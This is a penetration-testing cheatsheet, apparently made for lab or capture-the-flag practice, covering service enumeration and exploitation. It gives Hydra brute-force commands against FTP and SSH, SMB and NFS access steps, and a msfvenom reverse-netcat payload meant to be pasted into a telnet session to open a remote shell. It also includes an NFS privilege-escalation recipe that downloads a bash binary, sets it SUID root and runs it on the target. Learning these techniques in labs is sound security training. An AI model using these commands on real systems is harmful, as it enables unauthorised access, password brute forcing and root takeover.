# Cheatsheet

### Common 
* ```wget http://127.0.0.1:8000/file```
* ```python3 -m http.server```
* ```systemctl stop myservice```
* [-h / -help / --help] or man
* https://www.exploit-db.com/exploits/20745
* words `sudo apt install seclists`
https://github.com/security-cheatsheet/metasploit-cheat-sheet 



### Commands 
* SSH with key `ssh -i <key-file> <username>@<ip>`
* SSH with Password `ssh username@IP`
* list all permissions `ls -la fielname`
* 


## Useful location  
  ### .ssh Key 
   * Private key ssh ```/home/user-name/.ssh```
   * This file is the private key ```id_rsa```
   * change the file permission ``` chmod 600 ```
   * `ssh -i <key-file> <username>@<ip> `
  ### Wordlists 
   * /usr/share/wordlists/SecLists/Usernames
   *  if not found install it `sudo apt install seclists`
   *  /usr/share/wordlists/rockyou.txt 
  ### Nmap


# Fast Tool 
## Netcat
* nc -lvp [listening port], `nc -lvp 4444`

## Hydra 
* used to brute force Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB
* hydra -t 4 -l username -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp



# Services  
## SMB
### Enumerating SMB
* enum4linux [options] ip
* use option  ```-a``` all of the above (full basic enumeration)

### SMB Exploit 445, 139
* smbclient //[IP]/[SHARE]
* smbclient //10.10.10.2/sharefilename -U username -p 445

## Telnet 23
### Enumerating Telnet
* nmap
### Exploiting
* telnet [ip] [port]

## FTP 21
### channels 
* a command (sometimes called the control) channel
* a data channel.
### Enumerating FTP
* nmap
### Exploiting
* "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.

## NFS 
### NFS Tools
* `sudo apt install nfs-common`
* by defualt mount,showmount, nfsstat, gssd, idmapd, lockd, statd,
### Enumeration
* nmap
* show all shares `/usr/sbin/showmount -e [IP] `
### Exploiting
* create folder `mkdir /tmp/mount`
* mount folder `sudo mount -t nfs IP:share /tmp/mount/ -nolock`

## SMTP 25
### Enumeration
* nmap
* msfconsole
* auxiliary/scanner/smtp/smtp_enum
### Exploiting
* ` hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ssh` 

## MYSQL 3306
### Install 
* ` sudo apt install default-mysql-client`
### Enumeration
* nmap
### Exploiting
* ` mysql -h [IP] -u [username] -p` 

# Shells 
## Simple Shell msfvenom 

* using telnet 
```
"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format

```
* copy and paste the value on telnet session 

### Privilege Escalatation 
### Instalaltion 
* Download bash shell wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash 
## SUID
* SUID: the file or files can be run with the permissions of the file(s) owner/group.
* change bash file to suid bit `chmod +s filename`
* change to excute `chmod +x filename`
* change ower to root `chown root fielname`
* validate (sr-x) permssion `ls -la fielname`
* move the file to target (SSH/ NFS/ FTP )
* run the file with `./fielname -p` on target 
# other Important 
## Start a tcpdump listener

